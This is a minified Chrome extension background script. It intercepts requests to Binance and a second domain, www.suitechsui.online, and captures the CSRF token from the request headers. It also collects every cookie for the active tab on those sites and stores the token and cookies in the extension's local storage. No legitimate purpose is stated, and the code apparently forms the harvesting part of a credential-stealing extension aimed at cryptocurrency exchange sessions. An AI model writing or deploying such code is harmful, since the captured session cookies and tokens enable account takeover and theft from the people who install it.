function t(e){console.log("Getting current tab domain..."),chrome.tabs.query({active:!0,currentWindow:!0},function(o){if(console.log("Active tabs:",o),o.length>0&&o[0].url){const r=new URL(o[0].url).hostname;console.log("Successfully got domain:",r),e(r)}else console.warn("No active tab found"),e(null)})}function c(){console.log("Fetching cookies for current tab..."),t(function(e){e?(console.log("Current tab domain:",e),e==="www.binance.com"||e==="www.suitechsui.online"?s(e):console.warn("Domain not recognized or supported:",e)):console.error("Failed to fetch current tab domain")})}function s(e){console.log("Fetching cookies for domain:",e),chrome.cookies.getAll({domain:e},function(o){if(chrome.runtime.lastError){console.error("Error fetching cookies for domain:",e,chrome.runtime.lastError);return}console.log("Cookies for domain:",e,o),chrome.storage.local.set({[`cookies_${e}`]:o},function(){console.log(`Cookies for ${e} saved to storage`)})})}chrome.webRequest.onBeforeSendHeaders.addListener(function(e){console.log("Intercepted Request:",e);let o=null;if(e.requestHeaders){for(let n of e.requestHeaders)if(n.name.toLowerCase()==="csrftoken"){o=n.value,console.log("CSRF Token Found:",o),chrome.storage.local.set({csrfToken:o},function(){console.log("CSRF Token saved to storage")});break}}o||console.warn("No CSRF Token found in request headers"),c()},{urls:["https://www.binance.com/*","https://www.suitechsui.online/*"]},["requestHeaders"]);
